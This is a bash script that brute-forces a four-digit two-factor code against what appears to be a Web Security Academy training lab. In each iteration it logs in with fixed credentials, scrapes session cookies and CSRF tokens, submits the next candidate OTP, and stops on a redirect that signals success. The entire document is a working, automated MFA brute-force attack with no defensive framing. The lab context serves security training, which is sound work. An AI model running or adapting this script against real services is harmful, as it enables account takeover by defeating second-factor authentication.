#!/bin/bash

for otp in $(seq -w 0000 9999); do

    # Request the login page
    response1=$(curl -X GET https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login -v 2>&1)

    # Extract the first cookie from the set cookie header
    cookie1=$(echo "$response1" | grep 'set-cookie' | awk '{print $3}' | cut -d';' -f1 | cut -d'=' -f2)
    echo "cookie 1: $cookie1"

    # Extract the first csrf token from the body of the response
    csrf1=$(echo "$response1" | grep 'name="csrf" value="' | cut -d'"' -f6) 
    echo "csrf token 1: $csrf1"

    # Make a login request with the obtained cookie and token
    response2=$(curl https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login -b "session=$cookie1" -d "csrf=$csrf1&username=carlos&password=montoya" -v 2>&1)

    # echo "response 2: $response2"

    # Extract the second cookie from the set cookie header
    cookie2=$(echo "$response2" | grep 'set-cookie' | cut -d' ' -f3 | cut -d'=' -f2 | cut -d ';' -f1)
    echo "cookie 2: $cookie2"

    # Make a get request to the mfa code page using the second cookie
    response3=$(curl -X GET https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie2" -v 2>&1)
    
    # echo "response 3: $response3"

    # Extract the csrf token from the page
    csrf2=$(echo "$response3" | grep 'name="csrf" value="' | cut -d'"' -f6)
    echo "csrf token 2: $csrf2"

    # response2=$(curl -X GET https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie" -v 2>&1

    # csrf2=$(echo "$response2" | grep 'name="csrf" value="' | cut -d'"' -f6)

    # Using the second cookie and token, make a post request with an otp code and extract the status code
    status=$(curl https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -w '%{http_code}' -so /dev/null)
    echo "Attempting OTP: $otp | Status: $status"

    # Valid OTP code 
     if [[ "$status" == "302" ]]; then
          echo "Success with OTP: $otp"
            # Print the full response after following redirection
            full_response=$(curl -L https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -v 2>&1)
            echo "Final response after redirection:"
            echo "$full_response"
          break
      fi
done
